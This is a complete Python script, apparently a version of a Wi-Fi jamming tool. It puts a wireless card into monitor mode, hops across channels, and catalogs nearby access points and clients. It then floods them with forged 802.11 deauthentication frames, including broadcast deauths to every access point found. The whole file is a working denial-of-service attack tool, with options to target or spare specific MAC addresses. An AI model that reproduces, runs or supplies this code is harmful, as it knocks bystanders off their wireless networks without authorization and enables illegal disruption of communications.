#!/usr/bin/env python3
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb = 0

import os
import sys
import time
from threading import Thread, Lock
from subprocess import Popen, PIPE, DEVNULL
from signal import SIGINT, signal
import argparse
import socket
import struct
import fcntl
import re

# Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--skip", help="Skip deauthing this MAC address. Example: -s 00:11:BB:33:44:AA")
    parser.add_argument("-i", "--interface", help="Choose monitor mode interface. Example: -i mon5")
    parser.add_argument("-c", "--channel", help="Listen on and deauth only clients on the specified channel. Example: -c 6")
    parser.add_argument("-m", "--maximum", help="Maximum number of clients to deauth.")
    parser.add_argument("-n", "--noupdate", help="Do not clear the deauth list when maximum is reached", action='store_true')
    parser.add_argument("-t", "--timeinterval", help="Time interval between packets being sent.")
    parser.add_argument("-p", "--packets", help="Number of packets to send in each burst.")
    parser.add_argument("-d", "--directedonly", help="Skip broadcast deauth to APs", action='store_true')
    parser.add_argument("-a", "--accesspoint", help="MAC address of specific access point to target")
    parser.add_argument("--world", help="Enable scanning of channels 1-13", action="store_true")
    return parser.parse_args()

########################################
# Interface helpers
########################################

def get_mon_iface(args):
    global monitor_on
    monitors, interfaces = iwconfig()
    if args.interface:
        monitor_on = True
        return args.interface
    if len(monitors) > 0:
        monitor_on = True
        return monitors[0]
    else:
        print('['+G+'*'+W+'] Finding the most powerful interface...')
        interface = get_iface(interfaces)
        monmode = start_mon_mode(interface)
        return monmode

def iwconfig():
    monitors = []
    interfaces = {}
    try:
        proc = Popen(['iwconfig'], stdout=PIPE, stderr=DEVNULL)
    except OSError:
        sys.exit('['+R+'-'+W+'] Could not execute "iwconfig"')
    out = proc.communicate()[0]
    if isinstance(out, bytes):
        out = out.decode(errors='ignore')
    for line in out.splitlines():
        line = line.rstrip()
        if len(line) == 0:
            continue
        if not line.startswith(' '):
            wired_search = re.search(r'eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            if not wired_search:
                iface = line.split()[0]
                if 'Mode:Monitor' in line:
                    monitors.append(iface)
                elif 'IEEE 802.11' in line:
                    if 'ESSID:"' in line:
                        interfaces[iface] = 1
                    else:
                        interfaces[iface] = 0
    return monitors, interfaces

def get_iface(interfaces):
    scanned_aps = []
    if len(interfaces) < 1:
        sys.exit('['+R+'-'+W+'] No wireless interfaces found, bring one up and try again')
    if len(interfaces) == 1:
        for interface in interfaces:
            return interface
    for iface in interfaces:
        count = 0
        proc = Popen(['iwlist', iface, 'scan'], stdout=PIPE, stderr=DEVNULL)
        out = proc.communicate()[0]
        if isinstance(out, bytes):
            out = out.decode(errors='ignore')
        for line in out.splitlines():
            if ' - Address:' in line:
                count += 1
        scanned_aps.append((count, iface))
        print('['+G+'+'+W+'] Networks discovered by '+G+iface+W+': '+T+str(count)+W)
    try:
        interface = max(scanned_aps)[1]
        return interface
    except Exception as e:
        for iface in interfaces:
            interface = iface
            print('['+R+'-'+W+'] Minor error:', e)
            print('    Starting monitor mode on '+G+interface+W)
            return interface

def start_mon_mode(interface):
    print('['+G+'+'+W+'] Starting monitor mode off '+G+interface+W)
    try:
        os.system('ifconfig %s down' % interface)
        os.system('iwconfig %s mode monitor' % interface)
        os.system('ifconfig %s up' % interface)
        return interface
    except Exception:
        sys.exit('['+R+'-'+W+'] Could not start monitor mode')

def remove_mon_iface(mon_iface):
    os.system('ifconfig %s down' % mon_iface)
    os.system('iwconfig %s mode managed' % mon_iface)
    os.system('ifconfig %s up' % mon_iface)

def mon_mac(mon_iface):
    '''
    Get MAC address of interface
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        if isinstance(mon_iface, str):
            ifname = mon_iface.encode('utf-8')[:15]
        else:
            ifname = mon_iface[:15]
        info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', ifname))
        mac_bytes = info[18:24]
        mac = ':'.join('{:02x}'.format(b) for b in mac_bytes)
        print('['+G+'*'+W+'] Monitor mode: '+G+mon_iface+W+' - '+O+mac+W)
        return mac
    except Exception:
        return '00:00:00:00:00:00'

########################################
# Channel hopping & deauth logic
########################################

def channel_hop(mon_iface, args):
    global monchannel, first_pass
    channelNum = 0
    maxChan = 11 if not args.world else 13
    err = None

    while True:
        if args.channel:
            with lock:
                monchannel = args.channel
        else:
            channelNum += 1
            if channelNum > maxChan:
                channelNum = 1
                with lock:
                    first_pass = 0
            with lock:
                monchannel = str(channelNum)

            try:
                proc = Popen(['iw', 'dev', mon_iface, 'set', 'channel', monchannel], stdout=DEVNULL, stderr=PIPE)
            except OSError:
                print('['+R+'-'+W+'] Could not execute "iw"')
                os.kill(os.getpid(), SIGINT)
                sys.exit(1)
            errout = proc.communicate()[1]
            if isinstance(errout, bytes):
                errout = errout.decode(errors='ignore')
            for line in errout.splitlines():
                if len(line) > 2:
                    err = '['+R+'-'+W+'] Channel hopping failed: '+R+line+W

        output(err, monchannel)
        if args.channel:
            time.sleep(.05)
        else:
            if first_pass == 1:
                time.sleep(1)
                continue
        deauth(monchannel)

def deauth(monchannel):
    pkts = []
    if len(clients_APs) > 0:
        with lock:
            for x in clients_APs:
                client = x[0]
                ap = x[1]
                ch = x[2]
                if ch == monchannel:
                    deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
                    deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
                    pkts.append(deauth_pkt1)
                    pkts.append(deauth_pkt2)
    if len(APs) > 0 and not args.directedonly:
        with lock:
            for a in APs:
                ap = a[0]
                ch = a[1]
                if ch == monchannel:
                    deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap)/Dot11Deauth()
                    pkts.append(deauth_ap)

    if len(pkts) > 0:
        if not args.timeinterval:
            args.timeinterval = 0
        if not args.packets:
            args.packets = 1
        for p in pkts:
            sendp(RadioTap()/p, iface=mon_iface, inter=float(args.timeinterval), count=int(args.packets), verbose=False)

def output(err, monchannel):
    os.system('clear')
    if err:
        print(err)
    else:
        print('['+G+'+'+W+'] '+mon_iface+' channel: '+G+monchannel+W+'\n')
    if len(clients_APs) > 0:
        print('                  Deauthing                 ch   ESSID')
    with lock:
        for ca in clients_APs:
            if len(ca) > 3:
                print('['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1]+W+' - '+ca[2].ljust(2)+' - '+T+ca[3]+W)
            else:
                print('['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1]+W+' - '+ca[2])
    if len(APs) > 0:
        print('\n      Access Points     ch   ESSID')
    with lock:
        for ap in APs:
            print('['+T+'*'+W+'] '+O+ap[0]+W+' - '+ap[1].ljust(2)+' - '+T+ap[2]+W)
    print('')

def noise_filter(skip, addr1, addr2):
    ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:', mon_MAC]
    if skip:
        ignore.append(skip)
    for i in ignore:
        if i in addr1 or i in addr2:
            return True

def cb(pkt):
    global clients_APs, APs
    if args.maximum:
        if args.noupdate:
            if len(clients_APs) > int(args.maximum):
                return
        else:
            if len(clients_APs) > int(args.maximum):
                with lock:
                    clients_APs = []
                    APs = []

    if pkt.haslayer(Dot11):
        if pkt.addr1 and pkt.addr2:
            addr1 = pkt.addr1.lower()
            addr2 = pkt.addr2.lower()

            if args.accesspoint:
                if args.accesspoint.lower() not in [addr1, addr2]:
                    return

            if args.skip:
                if args.skip.lower() == addr2:
                    return

            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                APs_add(clients_APs, APs, pkt, args.channel, args.world)

            if pkt.type in [1, 2]:
                clients_APs_add(clients_APs, addr1, addr2)

def APs_add(clients_APs, APs, pkt, chan_arg, world_arg):
    try:
        ssid = pkt[Dot11Elt].info.decode(errors='ignore') if isinstance(pkt[Dot11Elt].info, bytes) else str(pkt[Dot11Elt].info)
    except Exception:
        ssid = ''
    bssid = pkt[Dot11].addr3.lower()
    try:
        # pkt[Dot11Elt:3].info is a bytes object containing channel number (usually single byte)
        elt = pkt[Dot11Elt:3]
        if elt and hasattr(elt, 'info') and len(elt.info) > 0:
            ap_channel = str(elt.info[0])
        else:
            return
        chans = [str(i) for i in range(1, 12)] if not args.world else [str(i) for i in range(1, 14)]
        if ap_channel not in chans:
            return
        if chan_arg:
            if ap_channel != chan_arg:
                return
    except Exception:
        return

    if len(APs) == 0:
        with lock:
            return APs.append([bssid, ap_channel, ssid])
    else:
        for b in APs:
            if bssid in b[0]:
                return
        with lock:
            return APs.append([bssid, ap_channel, ssid])

def clients_APs_add(clients_APs, addr1, addr2):
    if len(clients_APs) == 0:
        if len(APs) == 0:
            with lock:
                return clients_APs.append([addr1, addr2, monchannel])
        else:
            AP_check(addr1, addr2)
    else:
        for ca in clients_APs:
            if addr1 in ca and addr2 in ca:
                return
        if len(APs) > 0:
            return AP_check(addr1, addr2)
        else:
            with lock:
                return clients_APs.append([addr1, addr2, monchannel])

def AP_check(addr1, addr2):
    for ap in APs:
        if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():
            with lock:
                return clients_APs.append([addr1, addr2, ap[1], ap[2]])

def stop(sig, frame):
    if monitor_on:
        sys.exit('\n['+R+'!'+W+'] Closing')
    else:
        remove_mon_iface(mon_iface)
        os.system('service network-manager restart')
        sys.exit('\n['+R+'!'+W+'] Closing')

if __name__ == "__main__":
    if os.geteuid() != 0:
        sys.exit('['+R+'-'+W+'] Please run as root')
    clients_APs = []
    APs = []
    lock = Lock()
    args = parse_args()
    monitor_on = None
    mon_iface = get_mon_iface(args)
    conf.iface = mon_iface
    mon_MAC = mon_mac(mon_iface)
    first_pass = 1

    hop = Thread(target=channel_hop, args=(mon_iface, args))
    hop.daemon = True
    hop.start()

    signal(SIGINT, stop)

    try:
        sniff(iface=mon_iface, store=0, prn=cb)
    except Exception as msg:
        try:
            remove_mon_iface(mon_iface)
            os.system('service network-manager restart')
        except Exception:
            pass
        print('\n['+R+'!'+W+'] Closing')
        sys.exit(0)
